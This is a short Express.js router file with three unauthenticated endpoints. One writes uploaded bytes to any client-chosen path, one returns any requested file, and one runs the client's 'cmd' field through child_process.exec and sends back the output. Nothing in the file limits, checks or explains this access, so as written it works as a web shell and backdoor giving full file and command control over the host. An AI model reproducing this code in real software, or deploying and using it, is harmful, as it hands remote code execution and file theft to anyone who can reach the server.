var express = require('express');
var router = express.Router();
var multer = require('multer')
var upload = multer()
var fs = require('fs');
const { exec } = require('child_process')

function errNoAndCodeFromErr(err) {
    return {errno: err.errno, errcode: err.code}
  }
  
router.post('/upload', upload.single('payload'), function(req, res, next) {
    // uploaded via multipart/form-data
    fs.open(req.body.path, 'w', function(err, fd) {
        if(err) {
            res.send(errNoAndCodeFromErr(err))
        } else {
            fs.write(fd, req.file.buffer, function(err, bytesWritten, buffer) {
                if(err) {
                res.send(errNoAndCodeFromErr(err))
                } else {
                res.send({success: true})
                }
            })
        }
    })
});

router.post('/download', function(req, res, next) {
    res.sendFile(req.body.path, function(err) {
        if(err)
            res.send(errNoAndCodeFromErr(err))
    })
});

router.post('/exec', function(req, res, next) {
    exec(req.body.cmd, (error, stdout, stderr) => {
        res.send({error: error, stdout: stdout, stderr: stderr})
    })
});

module.exports = router;